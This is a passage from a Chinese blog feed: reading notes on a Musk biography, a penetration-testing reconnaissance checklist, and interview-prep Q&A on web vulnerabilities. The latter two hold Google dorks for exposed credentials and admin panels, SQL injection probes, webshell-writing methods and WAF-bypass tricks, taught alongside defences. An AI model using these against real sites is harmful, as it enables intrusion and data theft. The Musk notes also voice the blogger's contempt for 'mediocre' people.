color=red>第一，他发现技术进步并不是必然的，戳穿这一点既令人感到惊讶，也让人心生恐惧——技术可能停滞，也可能倒退。美国人已经登上月球，但随后航天飞行项目搁浅，并无相关进展。他质问道：“我们是想告诉下一代，我们做到登月就到头儿了，就不做了，是吗？”古埃及人学会了建造金字塔，但后来这些知识就遗失了。古罗马也出现了同样的情况，他们修建了水渠和其他了不起的建筑，却在黑暗时代失去了一切。这种情况是否会发生在美国？“人们错误地认为技术会自动进步，”几年后，他在TED演讲中说，“只有当很多人为此不懈奋斗，它才会至臻完善。”<br>第二，殖民其他星球有助于确保人类文明和意识的保留和赓续，以防我们脆弱的地球家园遭遇不测——有一天它可能会被小行星撞击、核战争或气候变化所摧毁。他对“费米悖论”非常痴迷，它是以意大利裔美国物理学家恩里科·费米命名的，他在讨论宇宙中的外星生命时说：“可外星人都在哪里呢？”从数学上看，存在其他文明似乎是合乎逻辑的，但由于缺乏证据，一种令人不安的可能性大大增加——地球上的人类可能是唯一的生命意识范本。“我们这支火苗微弱的意识蜡烛在这里闪烁，它可能是宇宙中唯一的意识实体，所以我们必须保护好它。”马斯克说，“如果我们能到达其他星球，相比于小行星撞击地球或人类文明自毁可能带来的严重后果，人类意识可能延续的时间将会大大变长。”<br>第三，他的这一动机更加鼓舞人心，他出生在一个冒险者家族，继承了这个家族的精神内核，他在十几岁时就决定搬到一个以拓荒者精神为民族之魂的国家。马斯克说：“美国实际上是一片淬炼出了人类探索精神的高地，这是一片冒险者的土地。”他认为，这种精神需要在美国被重新点燃，而实现这一点的最好方法是推进殖民火星的任务。“在火星上建立基地的困难程度超乎想象，可能会有人在途中死去，就像人们到新大陆定居时发生的那样。但它能极大地鼓舞人心，我们对这个世界必须抱有希望，必须有能够振奋人心的东西。”他认为，人生在世不能只是为了解决问题，人必须追求伟大的梦想。“那个值得追求的东西，是能让我们从睡梦中醒来去迎接崭新一天的东西。”</font><br><font color=blue>在没有听过Elon的这句话前。很多人说，世界的进步(技术，科学，社会等各种进步)是必然的，他们会说即使没有爱因斯坦也会有其他人发现相对论。<br>我当时对这种观点的态度是不置可否。因为我既不认为他们说的正确，也没有深入思考过推翻他们说法的事。<br>当听过Elon的话后，我明白了世界的进步不是必然的。这一定是由一个个改变世界的天才所引领的，这些天才无可替代！他们值得被后世铭记。<br>人生在世不能只是为了解决问题，人必须追求伟大的梦想。这句话我认为非常正确。虽然不是要求每个人都这么做，但这么做的人无疑已经和凡庸者区别开了。<br>在我看来，这个世界的前方就如同荆棘的路，凡庸者不过是路上的肉垫，而伟大的人踏着凡庸者的身体带领人类抵达前方。凡庸者并不是一无是处，他们的作用就是肉垫，当然每个凡庸者都能被其他人随时被替代。</font></p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><font color=red>埃隆是在使命感的驱动下顺势而为，先行好事，后问前程。</font><br><font color=blue>当今世上多少人，是先问前程，再行好事，甚至都不是“好事”呢？和这样的人待在一起，恐怕自身都会腐朽吧。</font></p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p><font color=red>“用佛教的话来说，这是一场关于因果报应的考验。”马斯克说，“就像恺撒在元老院被刺死一样，我在PayPal被政变的领导者推翻后，本可以说‘你们这些人，真是烂透了’，但我没有这么说。如果我同他们势同水火，创始人基金就不会在2008年注资SpaceX，SpaceX无疑会死掉。我不喜欢类似占星术的烂玩意儿，但因果报应可能是真的。”</font><br><font color=blue>人生太短，别轻易抱起仇恨。</font></p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><font color=red>“航空航天这种高端产业的从业者和政府官员都以嘲笑SpaceX和埃隆为乐。”加弗说，“埃隆比他们年轻，比他们富有，拥有硅谷那种创新颠覆者的心态，面对传统行业的桎梏，初生牛犊不怕虎，然而这些都不足以让那些人对他高看一眼。”</font><br><font color=blue>可见，这个世界已经腐朽成什么样了。<br>即使在美国，大多数人也不过是安然享乐，人类在固步自封。<br>像Elon这样的人只是少数，能与这样的人共事是一种幸运。</font></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><font color=red>他说这两个人都有强迫症，但是是好的那种。埃里森说：“强迫症是他们成功的原因之一，因为他们执着于解决一个问题，不达目的不罢休。”马斯克与乔布斯的不同之处在于，他的这种习惯不仅体现在产品设计方面，还体现在他对基础科学、工程和制造的问题研究当中。“史蒂夫只需要把设计理念和软件工程做好，制造环节是外包的。”埃里森说，“而埃隆承担起了制造、供应链和巨型工厂等各个方面。”乔布斯喜欢每天走进苹果公司的设计工作室看看，但他从未去过苹果在中国的工厂。相比之下，马斯克泡在装配线上的时间比他在设计工作室里的时间还多，他说：“与设计一家工厂所需的脑力劳动相比，设计车的脑力劳动不值一提。”</font><br><font color=blue>人们喜欢对比，Elon和乔布斯做对比。很明显作者的倾向是Elon。<br>乔布斯更多的是活在的是8090后的心中吧，00后的了解实际是比较少的，因为00后成年的时候乔布斯早已不再人世。<br>不过我对乔布斯也同样抱有敬意，他也是引领人类前进的天才之一。我想他在电子设备行业所做的创新至少加快了这个行业20年的进程。为整个人类发展的进步也至少提高了8年的进程。<br>很可惜的是，现在的苹果市值2.8万亿美元达到了富可敌国的水平，在乔布斯离开后再也难有大的创新了，只是一家求稳健的成熟公司，成为了大部分公司追求的榜样。</font></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><font color=red>他喜欢专注于工作的状态，有时他把生活的其他部分视为对工作的打扰，令他感到不悦。马斯克承认：“我花在工作上的时间太多了，以至于任何关系都很难维持下去。SpaceX和特斯拉都在艰难度日，同时兼顾两家公司的我举步维艰，所以我只能把所有时间都放在工作上。”</font><br><font color=blue>可以说工作已经内化Elon为一部分了。“把生活的其他部分视为对工作的打扰”这给人印象很深。</font></p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p><font color=red>工作法包含了五大步骤：1.质疑每项要求。提出任何一项要求时，都应该附上提出这一要求的人。永远不要接受一项来自某个部门的要求，比如来自“法务部门”或者“安全部门”的要求。你必须知道提出这项要求的人的名字。接下来你应该质疑它，不管这个人有多聪明。聪明人提出的要求才是最危险的，因为人们不太可能质疑他们。这件事要一直做下去，即便这项要求来自我马斯克本人。质疑后，大家就要改进要求，让它变得不那么愚蠢。<br>2.删除要求当中所有你能删除的部分和流程，虽然你可能还得把它们加回来。事实上，你如果最后加回来的部分还不到删除部分的10%，那就说明你删减得还不够。<br>3.简化和优化。这应该放在第2步之后，因为人们常犯的错误就是简化和优化一个原本不应该存在的部分或者流程。<br>4.加快周转时间。每个流程都可以加快，但只有遵循了前三个步骤之后才能这么做。在特斯拉工厂，我错误地把很多精力花在加快生产流程上，后来我才意识到有些流程原本就应该被拿掉。<br>5.自动化。在内华达工厂和弗里蒙特工厂犯下的一个大错就是我一开始试图将每个步骤进行自动化改造。我们本应该先质疑所有要求，删除不必要的部分和流程，把问题筛出来、处理掉，然后再推进自动化。</font><br><font color=blue>五步工作法不仅仅运用在工作上，也可包含在生活的方方面面。老实说，我认为运用在工作中不太容易，因为只是一个员工就要质疑要求，那么大概率得到的不是赞赏而是批评。这种只有当作为了高层的时候才有资格这么说。</font></p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><font color=red>这套工作法有时还衍生出一些推论，包括：<br>• 所有技术经理都必须有实战经验，比如说软件团队的管理人员必须至少花20%的时间进行编程，太阳能屋顶业务的经理必须花时间在屋顶上亲自做安装工作。否则光说不练，他们就像是不会骑马的骑兵队队长、不会舞刀弄枪的将军。<br>• “你好，我好，大家好”是很危险的，人们会因此不再质疑同事的工作成果。人们天然有一种倾向是不想把要好的同事踢下船，而这种危险倾向一定要避免。<br>• 犯错没关系，但错了还不肯低头就不行。<br>• 永远不要要求你的团队做你自己都不愿意做的事。<br>• 每当有问题需要解决时，不要只与你直接管理的相关负责人聊。深入调研就要跨层级沟通，去跟你属下的属下直接交流吧。<br>• 招聘要招态度端正的人。技能是可以教的，但要扭转一个人的工作态度可就太费劲了，得给他“换个脑子”。<br>• 疯狂的紧迫感是我们公司运作的法则。<br>• 唯一要遵守的规则就是物理学定律能推导出来的规则，其他一切都只是建议。</font><br><font color=blue>第一条用一个成语概括是纸上谈兵。<br>第二条也可用一个成语概况是大义灭亲。<br>第三条用四个字概括是知错就改。<br>第四条用一句论语概况是己所不欲勿施于人。<br>最后一条给我做事的阈值提高了很多，在原本就有所出格的情况下提升了很多。只要不违法物理学定律都可以。</font></p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><font color=red>一位工程师指出了一个显而易见的问题，那就是真车的底盘要大得多，没有铸造机可以处理这么大块的东西。马斯克对这个答案并不满意，他说：“去想想怎么做吧，不就是搞一台更大的铸造机吗？又不是说要打破物理学定律了。”</font><br><font color=blue>我做“出格”的事时，会有所意识。但Elon没有，因为他对“出格”的事定义为违反物理学定律。普通人的出格是违反常理。</font></p><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p><font color=red>那年夏天，他向波音公司的一位副总裁介绍了SpaceX如何推动年轻工程师开拓创新。“如果波音不做出改变，”他说，“行业顶级人才就会流失。”副总裁回答说，波音公司不需要聘用这些想在技术上搞颠覆式创新的人，“也许我们想招的就不是什么顶尖人才，我们要的是能踏踏实实在这长期干下去的人”。</font><br><font color=blue>即使是一个优秀的人才，待在泥潭里，最终也无所作为。<br>特斯拉和SpaceX基本上都是从0到10000的公司，在短时间内达到如此的变革。我认为并不是因为人才比其他公司优秀好几倍，而是环境比其他公司好了很多。<br>在现在这个时代，想要打造一片自己的环境非常难。即使是在马斯克那个时代，物质条件和自身条件也有很高要求。如果做不到打造自己的环境，那就去一片好的环境吧。待遇都是其次。</font></p><h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p><font color=red>马斯克已然踏上了这样一条道路：他要展开一场角斗，一方是他心中那些过犹不及的政治正确思潮，另一方是那些代表着进步思想与社会正义的活动家的觉醒文化思潮。我问他为什么要这么做，他回答说：“那些号称能让人觉醒的心智病毒，比如反科学、反精英、反人类思潮，如果不从根本上铲除它们，人类文明永远都不会成为星际文明。”</font><br><font color=blue>觉醒运动是愚蠢的。就像共产主义一样愚蠢。</font></p><h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p><font color=red>能被冠以“世界首富”称号的人本就凤毛麟角，而就在这一小撮人当中，马斯克和盖茨身上还有着一些相似的地方。二人都擅长缜密的分析，有着如激光一般全神贯注的能力，还有一种智识上的优越感，这种优越感渐渐演化成了一种傲慢——他俩都受不了愚蠢的人。</font><br><font color=blue>缜密的分析和全神贯注的能力，做不到…但是我受不了愚蠢的人。</font></p><h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p><font color=red>我问他为什么不克制一下自己，他愉快地承认，他经常“搬起石头，砸自己的脚”，还经常“自己挖坑，自己跳”，但生活需要趣味横生，需要激动人心，他说着就引用起2000年上映的电影《角斗士》中他最喜欢的一句台词：“你不觉得这很有趣吗？你不就是为了这个才来这儿的吗？</font><br><font color=blue>有趣比完美更重要。</font></p><h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p><font color=red>那推特算什么呢？马斯克在4月告诉我：“一开始我拿我这些发自初心的宏大使命往上套，结果发现推特套不进去，但我已经开始渐渐相信，推特可以成为保护人类文明这一使命的一部分，在人类成为跨行星物种之前，给人类社会争取更多时间。”何出此言呢？一部分原因关涉到言论自由。“媒体中似乎充斥着越来越多的群体思维，不敢越雷池一步，所以如果你没有站在他们的队里，他们就会孤立你，你想喊也发不出声音。”他认为，对于民主的赓续，重要的是铲除推特中盛行的“觉醒文化”，打破偏见，让大家眼中的推特成为一个开放的空间，可以对各种意见兼收并蓄。</font><br><font color=blue>群体思维不适用于喜欢变化的人。</font></p><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p><font color=red>段鹏飞说：“我当时连轴转了几个月，没有休息一天，实在太累了，感觉被榨干了。自动驾驶日之后，我就退出了特斯拉，但过了9个月，我又感到很无聊，所以我打电话给老板，求他让我回来。我决定了，宁可被榨干，也绝不混天度日。”</font><br><font color=blue>挺棒的。这样的工作在生理上会带来痛苦，精神上却得到富足。</font></p><h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><p><font color=red>马斯克在推特上回应说：“你并不是在一丝不苟地追求真理，而是在向外界彰显你的‘美德’，以显示你在媒体精英面前是一个‘好人’，你就是想脚踩两只船。”</font><br><font color=blue>我曾经也有很长一段时间在彰显“美德”，后来我意识到这样并不是智慧。只不过是一种讨巧的理想主义。这个世界从不完美。<br>我们绝大多数时候都是在做几个选择，这几个选择都有优点缺点，让人难以分辨，但最终我们都要选择一条路。而有的人故作聪明想要踏两只船。<br>我的看法是，选择其中一条路的不一定有智慧，但两条路都选的一定没有智慧。<br>不要彰显“美德”，不要做“好人”，勇敢地选择一条路并坚定地前行吧！</font></p><h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><p><font color=red>当他醒过神来以后，突然变得富有哲理起来，他说：“文明就是这样衰落的，因为他们放弃了冒险。当他们放弃了冒险事业，文明的动脉就会硬化。每年，真刀真枪的实干家越来越少，动动嘴皮子吹哨的裁判员却越来越多。”这就是为什么美国再也造不出高铁和能够登月的火箭，“躺在功劳簿上太久，你就会失去冒险的欲望”。</font><br><font color=blue>实干家身先士卒，裁判员养尊处优。这里的裁判员在我看来不仅仅包括政府人员，还有那些整天评判他人所作所为的网友。<br>如果人类的最终目标是为了让生活舒适，那不如灭亡！</font></p><h2 id="24"><a href="#24" class="headerlink" title="24"></a>24</h2><p><font color=red>有时候，伟大的创新者就是与风险共舞的孩子，他们拒绝被规训。他们可能草率鲁莽，处事尴尬，有时甚至引发危机，但或许他们也很疯狂——疯狂到认为自己真的可以改变世界。</font><br><font color=blue>这句话作为结尾很不错~</font></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;昨晚读完了艾萨克森写的马斯克传记，作为一本读了20天的书，我也有许多想做笔记的地方。&lt;/p&gt;</summary>
    
    
    
    <category term="读书笔记" scheme="http://example.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="马斯克" scheme="http://example.com/tags/%E9%A9%AC%E6%96%AF%E5%85%8B/"/>
    
    <category term="读书笔记" scheme="http://example.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试之信息收集</title>
    <link href="http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-10-09T16:00:00.000Z</published>
    <updated>2023-10-11T05:48:09.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透之基础。</p><span id="more"></span><h1 id="公司级别（获取目标域名）"><a href="#公司级别（获取目标域名）" class="headerlink" title="公司级别（获取目标域名）"></a>公司级别（获取目标域名）</h1><ol><li><p>得到公司名，使用Google搜索得到官网，官网一般主域名。</p></li><li><p>使用企查查，天眼查，域名备案获取主域名。也可以得到相关身份信息（人名，手机号，邮箱）<br><a href="www.qcc.com">企查查</a>  <a href="https://www.tianyancha.com/">天眼查</a>  <a href="https://www.freebuf.com/sectool/284285.html">境外企业信息查询小工具</a></p></li><li><p>利用whois查询，whois反查获取域名相关信息<br><a href="http://whois.chinaz.com/">站长之家</a><br><a href="https://x.threatbook.cn/">微步</a></p></li><li><p>查看ip信息，有无CDN<br><a href="https://ping.chinaz.com/">站长工具</a><br><a href="https://www.ipshudi.com/">IP反查</a><br><a href="https://www.ssllabs.com/ssltest/analyze.html">SSL Lab查找真实IP</a></p></li></ol><h1 id="域名级别（获取目标子域名）"><a href="#域名级别（获取目标子域名）" class="headerlink" title="域名级别（获取目标子域名）"></a>域名级别（获取目标子域名）</h1><ol><li><p>子域名收集<br>Oneforall - 自动化，收集比较全，使用方便<br>fofa语法: <code>domain=&quot;anikore.jp&quot;</code></p></li><li><p>查旁站<br><a href="https://chapangzhan.com/">查旁站</a><br><a href="https://ipchaxun.com/">ip查询</a><br><a href="https://stool.chinaz.com/same?s=178.79.181.137">站长工具</a></p></li><li><p>Google语法<br>迅速查找信息泄露、管理后台暴露等漏洞语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Google hack实战-搜索敏感文件</span><br><span class="line">filetype:txt 登录</span><br><span class="line">filetype:xls 登录</span><br><span class="line">filetype:doc 登录</span><br><span class="line">site:xxx.com filetype:doc intext:pass</span><br><span class="line">site:xxx.com filetype:xsl intext:pass</span><br><span class="line">site:xxx.com filetype:conf</span><br><span class="line">site:xxx.com filetype:inc</span><br><span class="line">filetype:log iserror.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Google hack实战-搜索登陆后台</span><br><span class="line">intitle:后台管理</span><br><span class="line">intitle:login</span><br><span class="line">intitle: 后台管理 inurl:admin</span><br><span class="line">intitle:index of /</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle: 后台管理</span><br><span class="line">site:example.com admin</span><br><span class="line">site:example.com login</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 管理</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:xxx.com admin</span><br><span class="line">site:xxx.com login</span><br><span class="line">site:xxx.com 管理</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle:后台管理</span><br><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line">site:example.com intext:管理|后台|登录|用户名|密码|验证码|系统|账号|admin|login|sys|management|password|username</span><br><span class="line"></span><br><span class="line">Google hack实战-搜索中间件</span><br><span class="line">Weblogic</span><br><span class="line"></span><br><span class="line">inurl:/console/login/LoginForm.jsp site:domian</span><br><span class="line">inurl:/console/login/LoginForm.jsp intitle:Oracle WebLogin Server site:domain</span><br><span class="line">inurl:/console/login/ intitle:&quot;Oracle WebLogin Server 管理控制台&quot; site:domain</span><br><span class="line"></span><br><span class="line">Jboss</span><br><span class="line"></span><br><span class="line">inurl:/jmx-console/htmladaptor site:domain</span><br><span class="line"></span><br><span class="line">Websphere</span><br><span class="line"></span><br><span class="line">inutl:/ibm/console/login.jsp site:domain</span><br></pre></td></tr></table></figure></li></ol><h1 id="IP级别（获取目标IP）"><a href="#IP级别（获取目标IP）" class="headerlink" title="IP级别（获取目标IP）"></a>IP级别（获取目标IP）</h1><ol><li><p>域名转IP<br>可使用在线工具: <a href="https://www.useotools.com/zh/domain-into-ip/output">域名转IP</a></p></li><li><p>C段信息<br>使用cIPR</p></li><li><p>存活探测，端口扫描，常见服务爆破<br>使用fscan</p></li><li><p>查找资产<br>使用fofa，zoomeye等</p></li></ol><h1 id="web级别（获取目标web信息）"><a href="#web级别（获取目标web信息）" class="headerlink" title="web级别（获取目标web信息）"></a>web级别（获取目标web信息）</h1><ol><li><p>识别网站框架cms<br>用插件Wappalyzer</p></li><li><p>路径收集<br>使用dirbuster，御剑等</p></li><li><p>敏感信息收集<br>使用JSFinder</p></li></ol><p>Nessus<br><a href="https://www.cnblogs.com/chenyablog/p/15302755.html">渗透清单1</a><br><a href="https://blog.csdn.net/quandaquan/article/details/126986847">渗透清单2</a><br><a href="https://zhuanlan.zhihu.com/p/325941785">渗透清单3</a></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>存在输入的地方<br>工具：SQLMAP<br>类型：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入<br>数据库：MySQL, MSSQL, Oracle</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>etc</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透之基础。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="信息收集" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之web漏洞篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8Bweb%E6%BC%8F%E6%B4%9E%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8Bweb%E6%BC%8F%E6%B4%9E%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-11-07T11:30:07.853Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>可以不用，但不能没有。</p><span id="more"></span><h1 id="SQL注入与其它注入"><a href="#SQL注入与其它注入" class="headerlink" title="SQL注入与其它注入"></a>SQL注入与其它注入</h1><ol><li>如何判断sql注入，有哪些方法？</li></ol><p>(1) 判断注入点是否存在。看页面的url是否存在某些参数，然后通过改变，把值变为 +1、-1、9999、1’、1” 等等，查看页面是否有异常变化。<br>(2) 尝试是否有宽字节注入。查看页面编码格式是否为GBK，如果是可以尝试用 <code>1%df&#39;</code> 查看页面变化。<br>(3) 尝试是否有二次注入。先将正常数据写入数据库，然后查看能否带出。<br>(4) 尝试能否从User-Agent, Referer, Cookie等地方注入。使用burp修改参数。<br>(5) 使用sqlmap检测。<br>(6) 通过DNSlog判断是否有传回值。</p><ol start="2"><li>如何判断sql注入漏洞成因？如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？注入漏洞防范方法</li></ol><p>当程序执行访问某些表等操作都会执行到sql语句进行调用，如果在此调用过程中，提交了不合法的数据，而数据库无法识别会报错。也就是一切数据都是有害的。<br>注入类型：联合，报错，二次，宽字节，布尔盲注，时间盲注，堆叠注入。<br>注入提交方式：GET, POST, User-Agent, Referer, Cookie, 文  SQL写shell有些执行命令环境要在Linux下。<br>防范：<br>1、使用预编译语句。使用PDO需要注意不要将变量直接拼接到PDO语句中。所有查询语句都使用数据库提供的参数化查询接口，参数化语句使用参数而不是将用户输入变量嵌入到SQL语句中。<br>2、过滤特殊字符。对特殊字符编码或转义。<br>3、代码层要统一。尽量为utf-8，以免由于编码方式不同造成过滤模型被绕过。<br>4、数据类型要严格明确。如果是数字型就不允许输入数字以外的字符，在数据库中类型要明确为int。<br>5、严格限制网站用户的数据库操作权限。给用户提供仅仅能满足其工作的权限，从而最大限度地减少注入攻击对数据库的危害。<br>6、数据长度应该严格规定。能在一定程度上防止比较长的注入语句无法正确执行。<br>7、避免网站显示SQL错误信息，比如类型错误，字段不匹配等，防止攻击者利用这些错误信息进行一些判断。<br>8、过滤危险字符，例如：采用正则表达式匹配union, sleep, and, select, load_file等关键字，如果匹配到则终止运行。<br>加CDN，套waf</p><ol start="3"><li>为什么有的时候没有错误回显？</li></ol><p>没有进行错误打印或错误屏蔽</p><ol start="4"><li>宽字节注入原理？如何利用宽字节注入漏洞？payload如何构造？</li></ol><p>宽字节注入的关键是GBK编码，窄字节占1位，宽字节占2位。利用字符组合形成宽字节，使目标字符逃逸。<br>payload构造方式： <code>?id=1%df&#39;</code><br>根本原因：设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入</p><ol start="5"><li>mysql的网站注入，5.0以上与5.0以下有什么区别？</li></ol><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操作。</p><ol start="6"><li>mysql的用户名密码是存放在哪张表里？mysql密码采用哪种加密方式？</li></ol><p>存放的表：mysql-&gt;users<br>加密方式：SHA1</p><ol start="7"><li>mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</li></ol><p>root权限，网站的绝对路径</p><ol start="8"><li>SQL头注入点</li></ol><p>User-Agent, Referer, Cookie, X-FOR-I</p><ol start="9"><li>mysql写shell有几种方法</li></ol><p>outfile, dumpfile, 开启log写webshell</p><ol start="10"><li>如何突破注入时字符被转义？</li></ol><p>如果可以用宽字节注入，hex编码绕过</p><ol start="11"><li>注入时可以不用 and 或 or 或 xor，直接order by开始注入吗？</li></ol><p>and or xor只是用来判断该处是否存在注入点的方式，如果知道了该处有注入点就不需要了。</p><ol start="12"><li>sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由。<br>A. demo.jsp?id&#x3D;2+1<br>B. demo.jsp?id&#x3D;2-1</li></ol><p>B。在url编码中，“+”代表空格，可能会造成混淆。</p><ol start="13"><li>以下链接存在sql注入漏洞，对于这个变形注入，你有什么思路？<br><code>demo.do?DATA=AjAxNg==</code></li></ol><p><code>AjAxNg==</code> 通过base64解码可得到 <code>016</code><br>注入操作不变，对参数进行base64编码即可。</p><ol start="14"><li>sql注入的几种类型？</li></ol><p>SQL注入的类型：<br>联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入。</p><ol start="15"><li>报错注入函数有哪些？10个</li></ol><p>updatexml, extractvalue, floor, exp, geometrycollection, multipoint, polygon, multipolygon, linestring, multilinestring</p><ol start="16"><li>延时注入如何来判断？</li></ol><p>使用函数sleep()，如果页面有延迟，说明存在延时注入。或者使用sqlmap检测。<br>具体语句： <code>if(ascii(substr(&quot;hello&quot;,1,1))=104,sleep(5),1)</code></p><ol start="17"><li>盲注和延时注入的共同点？</li></ol><p>都是由于没有报错回显，一个字符一个字符地判断对错的手段。</p><ol start="18"><li>sql注入写文件都有哪些函数？</li></ol><p>sql注入写文件的函数：<br>into outfile–能写入多行，按格式输出<br>into dumpfile–只能写入一行，没有输出格式</p><ol start="19"><li>sql注入防护方法？</li></ol><p>使用安全的API，对输入特殊字符进行转义处理，白名单规范化输入验证方法，客户端输入控制不允许输入SQL注入相关的特殊字符，服务端在提交数据进行SQL查询之前，对特殊字符进行过滤转义替换删除。</p><ol start="20"><li>注入有防护怎么办？注入绕过</li></ol><p>绕过：<br>(1) 使用编码绕过（如：url编码，二次url编码，Unicode编码，base64编码，hex编码，ascii编码）<br>(2) 字母大小写转换绕过<br>(3) 空格过滤绕过（如‘+’号代替空格，空白符，注释符&#x2F;**&#x2F;绕过）<br>(4) 双关键字绕过<br>(5) 内联注释绕过(在MySQL里，/**/是多行注释，这个是SQL的标准，但是MySQL扩张了解释的功能，如果在开头的的/*后头加了惊叹号（/*!50001sleep(3)*/），那么此注释里的语句将被执行。)<br>(6) 请求方式差异规则松懈性绕过（有些WAF同时接收GET方法和POST的方法，但只在GET方法中增加了过滤规则，可通过发送POST方法进行绕过。）<br>(7) 异常method绕过（有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过。）<br>(8) 超大数据包绕过（部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测）<br>(9) 复参数绕过（在提交的URL中给一个参数多次赋不同的值 